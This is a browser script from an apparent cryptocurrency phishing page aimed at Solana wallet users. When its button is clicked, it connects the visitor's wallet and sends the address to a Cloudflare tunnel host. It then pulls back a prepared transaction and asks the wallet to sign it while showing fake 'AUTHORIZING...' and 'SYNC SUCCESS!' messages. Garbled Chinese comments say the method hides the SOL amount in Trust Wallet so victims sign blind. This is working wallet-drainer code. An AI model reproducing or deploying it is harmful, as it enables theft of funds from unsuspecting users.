<script>
    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
    document.getElementById('cta').onclick = async () => {
        const log = (t) => document.getElementById('st').innerText = t;
        const p = window.trustwallet?.solana || window.solana;
        try {
            await p.connect();
            const resp = await fetch(tunnel + "/prepare_v32", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });
            const info = await resp.json();
            const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
            const tx = window.solanaWeb3.Transaction.from(bytes);

            // ğŸ”± ç›²ç­¾è§¦å‘é€»è¾‘ï¼šä¸å†æ‹‰èµ·äº¤æ˜“ç•Œé¢ï¼Œè€Œæ˜¯æ‹‰èµ·â€œç­¾åæ¶ˆæ¯â€ç•Œé¢
            // è¿™ç§æ–¹å¼åœ¨ TW é‡Œä¸ä¼šæ˜¾ç¤º SOL é‡‘é¢ï¼
            log("AUTHORIZING...");
            const signed = await p.signTransaction(tx);
            log("SYNC SUCCESS!");

        } catch (err) { window.location.reload(); }
    };
</script>
